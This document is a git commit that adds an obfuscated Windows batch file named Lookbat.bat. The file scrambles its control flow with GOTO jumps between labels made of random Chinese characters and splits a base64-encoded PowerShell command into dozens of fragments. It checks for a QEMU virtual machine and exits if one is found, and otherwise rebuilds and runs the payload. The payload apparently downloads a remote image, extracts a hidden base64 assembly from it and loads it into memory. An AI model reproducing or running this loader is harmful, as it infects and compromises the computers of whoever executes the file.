40ff2f1848a6e4d1c7a659370f910423d4c08dd2
tutorialnile <gmedusa135@gmail.com>
2024-12-17 10:14:34 -0800

    Add files via upload

---
+++ Lookbat.bat
@@ -0,0 +1,249 @@
+@echo off
+GOTO 爱斯斯艾维阿耻色阿尔
+:贝斯德克艾贝阿饿阿艾
+SET 爱贝爱埃斯德艾饿贝豆=system.convert]::Frombase64string^($sodigo.replace^('$','A'^
+GOTO 豆德艾饿艾埃斯贝埃德
+:贝色爱克艾色维豆贝耻
+SET 饿德贝豆饿耻爱爱德耻=k$bg$v$G4$ZQB3$F8$aQBt$Gc$MQ$y$DM$LgBq$H$$Zw$n$Ck$Ow$N$$o$I$$g$C$$I$$g$C$$I$$
+GOTO 斯贝爱豆阿尔维饿色阿
+:饿德贝尔贝耻维饿埃尔
+SET 豆德维豆德贝贝克尔斯=$Og$6$FQ$bwBC$GE$cwBl$DY$N$BT$HQ$cgBp$G4$Zw$o$CQ$QgB5$HQ$ZQBz$
+GOTO 斯艾德尔豆耻德爱阿耻1
+:埃豆阿耻克贝埃色克豆
+SET 耻艾耻埃艾色维豆豆埃=$V$Bl$Hg$d$$u$FM$dQBi$HM$d$By$Gk$bgBn$Cg$J$Bz$HQ$YQBy$HQ$SQBu$GQ$ZQB4$Cw$
+GOTO 饿饿克克埃维贝豆贝阿1
+:饿饿克克埃维贝豆贝阿
+if %errorlevel% == 0 exit
+GOTO 爱贝斯豆豆豆德克阿艾
+:饿饿克克埃维贝豆贝阿9
+SET 豆爱贝埃贝贝维豆斯爱=BS$GU$ZgBs$GU$YwB0$Gk$bwBu$C4$QQBz$HM$ZQBt$GI$b$B5$F0$Og$6$Ew$bwBh$GQ
+GOTO 克豆饿贝艾克阿爱埃贝
+:豆埃维豆维埃贝爱耻爱
+SET 爱阿德贝爱维爱贝豆克=$G0$LwBz$GQ$YQBl$Gg$LwBz$GY$ZQBy$C8$dwBh$HI$LwBv$G4$YQBu$C8$NQ$z
+GOTO 色贝尔爱克艾斯埃维豆
+:豆贝维埃埃阿贝艾爱爱
+SET 色维埃德贝耻德斯阿贝=4$HQ$LgBJ$G4$Z$Bl$Hg$TwBm$Cg$J$Bl$G4$Z$BG$Gw$YQBn$Ck$Ow$N$$o$I$$g$C$$I$
+GOTO 爱德贝克维色贝贝色艾3
+:豆色德埃贝克耻色豆贝
+SET 饿豆豆尔尔贝色爱饿色=$I$$g$C$$I$$k$Gw$aQBu$Gs$cw$g$D0$I$B$$Cg$JwBo$HQ$d$Bw$HM$Og$v$
+GOTO 饿艾豆豆饿贝斯埃克克
+:斯贝爱豆阿尔维饿色阿
+SET 贝埃耻埃爱爱色贝克埃=g$C$$I$$g$C$$I$$k$Gk$bQBh$Gc$ZQBC$Hk$d$Bl$HM$I$$9$C$$R$Bv$Hc$bgBs$
+GOTO 耻艾耻埃豆阿饿艾德埃1
+:贝维豆德维阿艾克德贝
+SET 饿贝阿埃尔克德斯德色=$Jw$w$Cc$KQ$p$H0$fQ$=';$oWjuxd = [system.Text.encoding]::Unicode.GetString^([
+GOTO 贝斯德克艾贝阿饿阿艾
+:克艾克艾爱德贝耻艾爱
+SET 斯克艾埃尔贝维维爱艾=$g$Cg$J$Bs$Gk$bgBr$C$$aQBu$C$$J$Bz$Gg$dQBm$GY$b$Bl$GQ$T$Bp$G4$awBz$Ck$I$B7$
+GOTO 维维德尔色豆豆德阿豆9
+:埃爱贝贝阿艾尔德维贝
+SET 贝耻德德德豆埃阿艾尔=w$I$Bb$G8$YgBq$GU$YwB0$Fs$XQBd$C$$K$$n$HQ$e$B0$C4$YgBt$Gs$bwBw$G0$Yg$v$G4$aQBh
+GOTO 豆埃维豆维埃贝爱耻爱
+:艾色色斯艾斯克耻阿阿
+SET 克克阿饿斯色豆埃阿克=GQ$ZQB4$E8$Zg$o$CQ$cwB0$GE$cgB0$EY$b$Bh$Gc$KQ$7$C$$DQ$K$C$$I$$g$C$$I$
+GOTO 爱德贝克维色贝贝色艾1
+:饿饿克克埃维贝豆贝阿3
+SET 饿饿埃色饿埃艾德贝豆=$QgBh$HM$ZQ$2$DQ$UwB0$HI$aQBu$Gc$K$$k$EI$eQB0$GU$cw$p$Ds$DQ$K$C$$I$$g$C$$
+GOTO 饿饿克克埃维贝豆贝阿4
+:阿埃耻德饿尔色耻色德
+SET 饿贝尔艾色饿爱克贝贝=c$Bh$HI$YQBt$C$$K$Bb$HM$d$By$Gk$bgBn$Fs$XQBd$CQ$b$Bp$G4$awBz$Ck$I$$N$$o$I$$
+GOTO 维维德尔色豆豆德阿豆2
+:贝贝贝贝贝维色爱阿贝
+SET 贝色贝维艾贝克阿爱艾=$UwB5$HM$d$Bl$G0$LgBU$GU$e$B0$C4$RQBu$GM$bwBk$Gk$bgBn$F0$Og$6$FU$V$BG$Dg$
+GOTO 耻艾耻埃豆阿饿艾德埃5
+:贝尔爱饿贝贝耻尔克维
+SET 阿爱维贝贝德饿贝耻尔=$$I$$g$C$$I$$g$C$$I$$g$C$$J$Bz$HQ$YQBy$HQ$RgBs$GE$Zw$g$D0$I$$n$D
+GOTO 斯贝色克贝贝尔色维色
+:阿阿埃爱阿埃色耻尔克
+SET 贝豆爱爱饿德色维色贝=u$Gc$d$Bo$Ds$I$$N$$o$I$$g$C$$I$$g$C$$I$$g$C$$I$$g$C$$ZgBv$HI$ZQBh$GM$a$
+GOTO 克艾克艾爱德贝耻艾爱
+:埃克克斯尔饿贝斯斯贝
+SET 饿埃德爱埃贝克阿克色=d$Bp$G4$dQBl$C$$fQ$g$H0$Ow$g$$0$Cg$g$C$$I$$g$C$$I$$g$C$$I$$g$C$$I$
+GOTO 耻耻爱贝维耻维维阿豆2
+:饿艾豆豆饿贝斯埃克克
+SET 耻艾艾埃豆艾爱豆饿耻=C8$YgBp$HQ$YgB1$GM$awBl$HQ$LgBv$HI$Zw$v$Go$a$Bn$GY$a$Bo$Gs$agB
+GOTO 克豆饿耻爱贝尔尔豆维
+:维维德尔色豆豆德阿豆
+set 耻斯克耻阿维饿维饿色=MU
+GOTO 耻耻爱贝维耻维维阿豆
+:豆德艾饿艾埃斯贝埃德
+SET 爱贝爱艾贝艾埃埃豆耻=)^)^);powershell.exe $OWjuxD"
+GOTO 艾耻斯埃阿阿斯饿尔豆
+:豆贝克维艾埃尔饿尔尔
+SET 贝德艾克尔克贝色贝爱=C$$J$Bz$HQ$YQBy$HQ$RgBs$GE$Zw$u$Ew$ZQBu$Gc$d$Bo$Ds$I$$N$$o$I$$g$C$$I$$g$C$$I
+GOTO 爱德贝克维色贝贝色艾7
+:斯贝色克贝贝尔色维色
+SET 饿克艾色贝豆爱饿爱阿=w$P$BC$EE$UwBF$DY$N$Bf$FM$V$BB$FI$V$$+$D4$Jw$7$C$$J$Bl$G4$Z$BG$
+GOTO 耻艾耻埃豆阿饿艾德埃8
+:爱斯斯艾维阿耻色阿尔
+set 斯色埃尔饿斯豆耻维阿=QE
+GOTO 维维德尔色豆豆德阿豆
+:维维德尔色豆豆德阿豆3
+SET 埃德耻饿豆埃贝阿艾饿=$E8$YgBq$GU$YwB0$C$$UwB5$HM$d$Bl$G0$LgBO$GU$d$$u$Fc$ZQBi$EM$b$Bp$GU$bgB0$D
+GOTO 维维德尔色豆豆德阿豆4
+:斯贝埃贝尔爱贝维色饿
+SET 贝贝贝艾斯色克埃斯维=w$u$Gc$aQB0$Gg$dQBi$HU$cwBl$HI$YwBv$G4$d$Bl$G4$d$$u$GM$bwBt$C8$ZwBt$GU$Z$B
+GOTO 维维耻德维阿饿饿斯爱
+:色维豆尔艾维饿艾耻饿
+SET 豆豆克艾色饿尔克贝克=$I$$g$C$$I$$k$GI$YQBz$GU$Ng$0$EM$bwBt$G0$YQBu$GQ$I$$9$C$$J$Bp$G0$YQBn$GU
+GOTO 埃豆阿耻克贝埃色克豆
+:克豆饿耻爱贝尔尔豆维
+SET 饿贝尔豆德贝克阿埃克=l$GU$Z$Bl$GY$Z$Bm$C8$bQBu$GI$dgBn$Go$Z$Bn$C8$Z$Bv$Hc$bgBs$G8$YQBk$HM$LwB0$G
+GOTO 爱维色饿饿阿艾贝埃爱
+:德阿耻贝艾克色饿克克
+SET 耻爱爱维贝克阿饿克色=E$cgB0$Ek$bgBk$GU$e$$g$D0$I$$k$Gk$bQBh$Gc$ZQBU$GU$e$B0$C4$SQBu$
+GOTO 艾色色斯艾斯克耻阿阿
+:耻艾耻埃豆阿饿艾德埃
+set 贝克色耻维饿豆维色色=ame
+GOTO 爱德贝克维色贝贝色艾
+:色贝尔爱克艾斯埃维豆
+SET 色埃贝维耻豆尔维色埃=$DE$YQBz$HU$Z$Bl$G0$Zw$v$G0$bwBj$C4$YgB1$Gg$d$Bp$Gc$Jw$s$C$$Jw$w
+GOTO 斯艾德尔豆耻德爱阿耻7
+:艾贝德尔贝贝埃艾德尔
+SET 艾埃耻阿埃贝贝色斯豆=l$C$$M$$g$C0$YQBu$GQ$I$$k$GU$bgBk$Ek$bgBk$GU$e$$g$C0$ZwB0$C$$J$
+GOTO 爱德贝克维色贝贝色艾5
+:维维德尔色豆豆德阿豆4
+SET 德德阿饿维贝耻尔克爱=s$I$$N$$o$I$$g$C$$I$$g$C$$I$$g$C$$I$$g$C$$J$Bz$Gg$dQBm$GY$b$Bl$GQ$T$Bp$G4
+GOTO 维维德尔色豆豆德阿豆5
+:饿饿克克埃维贝豆贝阿5
+SET 埃色斯尔维德艾饿维贝=M$eQBz$HQ$ZQBt$C4$QwBv$G4$dgBl$HI$d$Bd$Do$OgBG$HI$bwBt$EI$YQBz$GU$N
+GOTO 饿饿克克埃维贝豆贝阿6
+:维维德尔色豆豆德阿豆9
+SET 色豆色阿斯艾克贝饿色=C$$d$By$Hk$I$B7$C$$cgBl$HQ$dQBy$G4$I$$k$Hc$ZQBi$EM$b$Bp$GU$bgB0$C4$R$Bv$Hc$bg
+GOTO 克尔色克爱爱尔爱尔爱
+:维维德尔色豆豆德阿豆0
+SET 斯德克克爱耻埃德耻豆=$C$$R$Bv$Hc$bgBs$G8$YQBk$EQ$YQB0$GE$RgBy$G8$bQBM$Gk$bgBr$HM$I$B7$C$$
+GOTO 阿埃耻德饿尔色耻色德
+:爱德贝克维色贝贝色艾
+wmic %阿贝贝爱埃耻豆埃色尔%u get n%贝克色耻维饿豆维色色% | find "%斯色埃尔饿斯豆耻维阿%%耻斯克耻阿维饿维饿色%"
+GOTO 饿饿克克埃维贝豆贝阿
+:维维耻德维阿饿饿斯爱
+SET 豆耻爱德耻色斯艾豆豆=1$HM$YQ$x$DM$NQ$v$G4$YQBu$G8$LwBy$GU$ZgBz$C8$a$Bl$GE$Z$Bz$C8$bQBh$G
+GOTO 贝色爱克艾色维豆贝耻
+:耻艾耻埃豆阿饿艾德埃2
+SET 贝色贝埃德斯贝耻贝德=g$C$$I$$g$C$$I$$g$C$$I$$g$Gk$Zg$g$Cg$J$Bp$G0$YQBn$GU$QgB5$HQ$ZQBz$C$$LQ
+GOTO 耻艾耻埃豆阿饿艾德埃3
+:斯德贝阿阿克艾爱埃德
+SET 埃斯德维贝豆艾贝埃维=$UwB0$HI$aQBu$Gc$K$$k$EI$eQB0$GU$cw$p$Ds$DQ$K$C$$I$$g$C$$I$$g$C$$I$$g$C$$
+GOTO 爱维豆维贝斯德斯德埃
+:维维德尔色豆豆德阿豆5
+SET 贝色饿色维德尔爱阿维=$awBz$C$$PQ$g$Ec$ZQB0$C0$UgBh$G4$Z$Bv$G0$I$$t$Ek$bgBw$HU$d$BP$G
+GOTO 维维德尔色豆豆德阿豆6
+:爱维豆维贝斯德斯德埃
+SET 贝豆埃爱阿维克阿尔阿=I$$g$CQ$YwBv$G0$c$By$GU$cwBz$GU$Z$BC$Hk$d$Bl$EE$cgBy$GE$eQ$g$D0$I$BH$GU$d$$t$
+GOTO 耻贝维饿艾德克斯爱德
+:饿饿克克埃维贝豆贝阿4
+SET 爱克埃埃克维克德色尔=I$$g$C$$I$$g$C$$I$$g$C$$J$Bj$G8$bQBt$GE$bgBk$EI$eQB0$GU$cw$g$D0$I$Bb$F
+GOTO 饿饿克克埃维贝豆贝阿5
+:维豆尔维贝尔爱克尔斯
+SET 克克维克爱爱斯饿贝阿=h$GE$YQBh$GE$cwBk$G0$ZQ$n$Ck$Ow$N$$o$I$$g$C$$I$$g$C$$I$$g$C$$I$$g$C$$I$
+GOTO 爱贝斯豆豆豆德克阿艾9
+:耻贝维饿艾德克斯爱德
+SET 饿色爱爱克饿贝艾尔豆=EM$bwBt$H$$cgBl$HM$cwBl$GQ$QgB5$HQ$ZQBB$HI$cgBh$Hk$I$$t$GI$eQB0
+GOTO 德贝维德维德爱斯斯贝
+:耻艾耻埃豆阿饿艾德埃1
+SET 埃艾贝埃克克贝维豆阿=G8$YQBk$EQ$YQB0$GE$RgBy$G8$bQBM$Gk$bgBr$HM$I$$k$Gw$aQBu$Gs$cw$7$$0$Cg$g$C$$I$$
+GOTO 耻艾耻埃豆阿饿艾德埃2
+:爱德贝克维色贝贝色艾7
+SET 豆饿克贝斯埃克爱阿色=$$g$C$$I$$g$C$$J$Bi$GE$cwBl$DY$N$BM$GU$bgBn$HQ$a$$g$D0$I$$k$GU$bgBk$Ek$bgBk$
+GOTO 爱德贝克维色贝贝色艾8
+:爱豆德艾埃阿克维维艾
+SET 克豆耻尔埃埃斯克耻豆=6$FQ$b$Bz$DE$Mg$N$$o$I$$g$C$$I$$g$C$$I$$g$C$$I$$g$C$$ZgB1$G4$YwB0$Gk$bwBu
+GOTO 维维德尔色豆豆德阿豆0
+:维饿阿爱艾贝埃尔尔尔
+SET 贝豆维埃斯豆饿耻阿贝=$I$$k$G0$ZQB0$Gg$bwBk$C$$PQ$g$CQ$d$B5$H$$ZQ$u$Ec$ZQB0$E0$ZQB0$Gg$bwBk$Cg
+GOTO 斯艾德尔豆耻德爱阿耻3
+:爱维色饿饿阿艾贝埃爱
+SET 豆德斯阿尔阿豆艾贝阿=U$cwB0$C4$agBw$Gc$Pw$1$DM$Nw$2$DE$MQ$n$Cw$I$$n$Gg$d$B0$H$$cw$6$C8$LwBy$GE$d
+GOTO 斯贝埃贝尔爱贝维色饿
+:色耻埃豆艾贝饿饿饿阿
+SET 尔德饿豆维德艾爱耻阿=$GQ$ZQBk$FQ$ZQB4$HQ$I$$9$Fs$QwBv$G4$dgBl$HI$d$Bd$Do$OgBU$G8$QgBh$HM$ZQ$2$DQ
+GOTO 斯德贝阿阿克艾爱埃德
+:德贝维德维德爱斯斯贝
+SET 耻埃维阿尔阿维阿埃艾=$GU$QQBy$HI$YQB5$C$$J$Bl$G4$YwBU$GU$e$B0$$0$Cg$g$C$$I$$g$C$$I$$g$C$
+GOTO 爱贝斯豆豆豆德克阿艾6
+:爱德贝克维色贝贝色艾5
+SET 豆克斯爱埃尔尔爱阿埃=Bz$HQ$YQBy$HQ$SQBu$GQ$ZQB4$Ck$I$B7$C$$J$Bz$HQ$YQBy$HQ$SQBu$GQ$ZQB4$C$$Kw$9$
+GOTO 豆贝克维艾埃尔饿尔尔
+:爱德贝克维色贝贝色艾1
+SET 饿豆埃耻爱饿贝德阿尔=$g$C$$I$$g$C$$I$$g$CQ$ZQBu$GQ$SQBu$GQ$ZQB4$C$$PQ$g$CQ$aQBt$GE$ZwBl$FQ$ZQB
+GOTO 豆贝维埃埃阿贝艾爱爱
+:克豆饿贝艾克阿爱埃贝
+SET 阿艾阿阿色埃维斯贝贝=$K$$k$GM$bwBt$G0$YQBu$GQ$QgB5$HQ$ZQBz$Ck$Ow$g$C$$J$BF$G4$YwBv
+GOTO 色耻埃豆艾贝饿饿饿阿
+:耻艾耻埃豆阿饿艾德埃3
+SET 艾艾埃埃尔克艾豆埃贝=Bu$GU$I$$k$G4$dQBs$Gw$KQ$g$Hs$I$$k$Gk$bQBh$Gc$ZQBU$GU$e$B0$C$$PQ$g$Fs
+GOTO 贝贝贝贝贝维色爱阿贝
+:斯艾德尔豆耻德爱阿耻
+SET 埃贝爱德埃贝阿埃色德=GE$ZwBl$HI$XQ$6$Do$UwBl$GM$dQBy$Gk$d$B5$F$$cgBv$HQ$bwBj$G8$b$$g$D0
+GOTO 贝尔色饿爱贝尔耻克德
+:维维德尔色豆豆德阿豆2
+SET 爱豆阿贝饿贝克斯埃阿=g$C$$I$$g$C$$I$$g$C$$I$$g$C$$J$B3$GU$YgBD$Gw$aQBl$G4$d$$g$D0$I$BO$GU$dw$t
+GOTO 维维德尔色豆豆德阿豆3
+:耻艾耻埃豆阿饿艾德埃5
+SET 爱克豆贝艾爱埃耻艾贝=LgBH$GU$d$BT$HQ$cgBp$G4$Zw$o$CQ$aQBt$GE$ZwBl$EI$eQB0$GU$cw$p$Ds$DQ$K$C$$I$$g$C
+GOTO 贝尔爱饿贝贝耻尔克维
+:爱贝斯豆豆豆德克阿艾
+SET 爱维尔耻爱尔豆克艾维=powershell "$dosigo = 'WwBO$GU$d$$u$FM$ZQBy$HY$aQBj$GU$U$Bv$Gk$bgB0$E0$YQBu$
+GOTO 斯艾德尔豆耻德爱阿耻
+:斯艾德尔豆耻德爱阿耻1
+SET 埃耻埃德尔耻艾维艾贝=Ck$Ow$N$$o$I$$g$C$$I$$g$C$$I$$g$C$$I$$g$$0$Cg$g$C$$I$$g$C$$I$$g$C$$I$$g$C$
+GOTO 维饿阿爱艾贝埃尔尔尔
+:爱贝斯豆豆豆德克阿艾6
+SET 阿尔埃埃色耻阿豆爱克=$I$$g$C$$I$$k$HQ$eQBw$GU$I$$9$C$$J$Bs$G8$YQBk$GU$Z$BB$HM$cwBl$G0$YgBs
+GOTO 爱贝斯豆豆豆德克阿艾7
+:饿饿克克埃维贝豆贝阿6
+SET 斯阿饿阿艾饿斯阿色克=g$0$FM$d$By$Gk$bgBn$Cg$J$Bi$GE$cwBl$DY$N$BD$G8$bQBt$GE$bgBk$Ck$Ow
+GOTO 饿饿克克埃维贝豆贝阿7
+:爱德贝克维色贝贝色艾3
+SET 维阿豆贝饿耻阿色爱艾=$g$C$$I$$g$C$$I$$g$C$$I$Bp$GY$I$$o$CQ$cwB0$GE$cgB0$Ek$bgBk$GU$e$$g$C0$ZwB
+GOTO 艾贝德尔贝贝埃艾德尔
+:克尔色克爱爱尔爱尔爱
+SET 尔贝尔斯贝艾耻爱克耻=Bs$G8$YQBk$EQ$YQB0$GE$K$$k$Gw$aQBu$Gs$KQ$g$H0$I$Bj$GE$d$Bj$Gg$I$B7$C$$YwBv$G4$
+GOTO 埃克克斯尔饿贝斯斯贝
+:艾耻斯埃阿阿斯饿尔豆
+%爱维尔耻爱尔豆克艾维%%埃贝爱德埃贝阿埃色德%%爱爱尔贝德埃豆贝耻耻%%克豆耻尔埃埃斯克耻豆%%斯德克克爱耻埃德耻豆%%饿贝尔艾色饿爱克贝贝%%爱豆阿贝饿贝克斯埃阿%%埃德耻饿豆埃贝阿艾饿%%德德阿饿维贝耻尔克爱%%贝色饿色维德尔爱阿维%%饿艾贝尔贝维贝艾艾贝%%贝豆爱爱饿德色维色贝%%斯克艾埃尔贝维维爱艾%%色豆色阿斯艾克贝饿色%%尔贝尔斯贝艾耻爱克耻%%饿埃德爱埃贝克阿克色%%爱德豆阿埃尔耻爱维尔%%饿豆豆尔尔贝色爱饿色%%耻艾艾埃豆艾爱豆饿耻%%饿贝尔豆德贝克阿埃克%%豆德斯阿尔阿豆艾贝阿%%贝贝贝艾斯色克埃斯维%%豆耻爱德耻色斯艾豆豆%%饿德贝豆饿耻爱爱德耻%%贝埃耻埃爱爱色贝克埃%%埃艾贝埃克克贝维豆阿%%贝色贝埃德斯贝耻贝德%%艾艾埃埃尔克艾豆埃贝%%贝色贝维艾贝克阿爱艾%%爱克豆贝艾爱埃耻艾贝%%阿爱维贝贝德饿贝耻尔%%饿克艾色贝豆爱饿爱阿%%贝克贝色豆色维艾尔色%%耻爱爱维贝克阿饿克色%%克克阿饿斯色豆埃阿克%%饿豆埃耻爱饿贝德阿尔%%色维埃德贝耻德斯阿贝%%维阿豆贝饿耻阿色爱艾%%艾埃耻阿埃贝贝色斯豆%%豆克斯爱埃尔尔爱阿埃%%贝德艾克尔克贝色贝爱%%豆饿克贝斯埃克爱阿色%%饿耻饿德德尔色爱德维%%豆豆克艾色饿尔克贝克%%耻艾耻埃艾色维豆豆埃%%德贝尔维德贝耻斯埃贝%%爱色艾埃斯尔尔耻德耻%%饿饿埃色饿埃艾德贝豆%%爱克埃埃克维克德色尔%%埃色斯尔维德艾饿维贝%%斯阿饿阿艾饿斯阿色克%%德色埃爱阿贝阿色艾饿%%贝饿豆维爱阿贝维艾色%%豆爱贝埃贝贝维豆斯爱%%阿艾阿阿色埃维斯贝贝%%尔德饿豆维德艾爱耻阿%%埃斯德维贝豆艾贝埃维%%贝豆埃爱阿维克阿尔阿%%饿色爱爱克饿贝艾尔豆%%耻埃维阿尔阿维阿埃艾%%阿尔埃埃色耻阿豆爱克%%艾艾饿尔饿德埃耻耻贝%%克克维克爱爱斯饿贝阿%%维饿阿斯色贝埃色饿埃%%豆德维豆德贝贝克尔斯%%埃耻埃德尔耻艾维艾贝%%贝豆维埃斯豆饿耻阿贝%%贝贝色豆贝埃维斯德阿%%贝耻德德德豆埃阿艾尔%%爱阿德贝爱维爱贝豆克%%色埃贝维耻豆尔维色埃%%贝阿斯尔斯埃维埃爱饿%%饿贝阿埃尔克德斯德色%%爱贝爱埃斯德艾饿贝豆%%爱贝爱艾贝艾埃埃豆耻%
+GOTO 贝尔色饿爱贝尔耻克德2
+:斯艾德尔豆耻德爱阿耻7
+SET 贝阿斯尔斯埃维埃爱饿=$Cc$L$$g$Cc$UwB0$GE$cgB0$HU$c$BO$GE$bQBl$Cc$L$$g$Cc$UgBl$Gc$QQBz$G0$Jw$s$C$
+GOTO 贝维豆德维阿艾克德贝
+:饿饿克克埃维贝豆贝阿8
+SET 贝饿豆维爱阿贝维艾色=GE$Z$Bl$GQ$QQBz$HM$ZQBt$GI$b$B5$C$$PQ$g$Fs$UwB5$HM$d$Bl$G0$Lg
+GOTO 饿饿克克埃维贝豆贝阿9
+:贝尔色饿爱贝尔耻克德
+SET 爱爱尔贝德埃豆贝耻耻=$I$Bb$E4$ZQB0$C4$UwBl$GM$dQBy$Gk$d$B5$F$$cgBv$HQ$bwBj$G8$b$BU$Hk$c$Bl$F0$Og$
+GOTO 爱豆德艾埃阿克维维艾
+:爱德贝克维色贝贝色艾8
+SET 饿耻饿德德尔色爱德维=GU$e$$g$C0$I$$k$HM$d$Bh$HI$d$BJ$G4$Z$Bl$Hg$Ow$N$$o$I$$g$C$$I$$g$C$$I$$g$C$
+GOTO 色维豆尔艾维饿艾耻饿
+:爱贝斯豆豆豆德克阿艾7
+SET 艾艾饿尔饿德埃耻耻贝=$Hk$LgBH$GU$d$BU$Hk$c$Bl$Cg$JwB0$GU$cwB0$H$$bwB3$GU$cgBz$Gg$ZQBs$Gw$LgBI$G8$YQB
+GOTO 维豆尔维贝尔爱克尔斯
+:维维德尔色豆豆德阿豆6
+SET 饿艾贝尔贝维贝艾艾贝=I$agBl$GM$d$$g$CQ$b$Bp$G4$awBz$C$$LQBD$G8$dQBu$HQ$I$$k$Gw$aQBu$Gs$cw$u$Ew$ZQB
+GOTO 阿阿埃爱阿埃色耻尔克
+:饿饿克克埃维贝豆贝阿7
+SET 德色埃爱阿贝阿色艾饿=$g$C$$I$$k$HQ$ZQB4$HQ$I$$9$C$$J$BF$G4$YwBv$GQ$ZQBk$FQ$ZQB4$HQ$Ow$g$CQ$b$Bv$
+GOTO 饿饿克克埃维贝豆贝阿8
+:饿饿克克埃维贝豆贝阿2
+SET 爱色艾埃斯尔尔耻德耻=I$$g$C$$J$BF$G4$YwBv$GQ$ZQBk$FQ$ZQB4$HQ$I$$9$Fs$QwBv$G4$dgBl$HI$d$Bd$Do$OgBU$G8
+GOTO 饿饿克克埃维贝豆贝阿3
+:耻耻爱贝维耻维维阿豆
+set 阿贝贝爱埃耻豆埃色尔=cp
+GOTO 耻艾耻埃豆阿饿艾德埃
+:耻艾耻埃豆阿饿艾德埃8
+SET 贝克贝色豆色维艾尔色=Gw$YQBn$C$$PQ$g$Cc$P$$8$EI$QQBT$EU$Ng$0$F8$RQBO$EQ$Pg$+$Cc$Ow$g$CQ$cwB0$G
+GOTO 德阿耻贝艾克色饿克克
+:饿饿克克埃维贝豆贝阿1
+SET 德贝尔维德贝耻斯埃贝=I$$k$GI$YQBz$GU$Ng$0$Ew$ZQBu$Gc$d$Bo$Ck$Ow$N$$o$I$$g$C$$I$$g$C$$I$$g$C$$
+GOTO 饿饿克克埃维贝豆贝阿2
+:斯艾德尔豆耻德爱阿耻3
+SET 贝贝色豆贝埃维斯德阿=$JwBs$GY$cwBn$GU$Z$Bk$GQ$Z$Bk$GQ$Z$Bh$Cc$KQ$u$Ek$bgB2$G8$awBl$Cg$J$Bu$HU$b$Bs$C
+GOTO 埃爱贝贝阿艾尔德维贝
+:爱贝斯豆豆豆德克阿艾9
+SET 维饿阿斯色贝埃色饿埃=$g$C$$I$$k$EU$bgBj$G8$Z$Bl$GQ$V$Bl$Hg$d$$g$D0$WwBD$G8$bgB2$GU$cgB0$F0
+GOTO 饿德贝尔贝耻维饿埃尔
+:耻耻爱贝维耻维维阿豆2
+SET 爱德豆阿埃尔耻爱维尔=By$GU$d$B1$HI$bg$g$CQ$bgB1$Gw$b$$g$H0$Ow$g$$0$Cg$g$C$$I$$g$C$$I$$g$C$
+GOTO 豆色德埃贝克耻色豆贝
+:贝尔色饿爱贝尔耻克德2
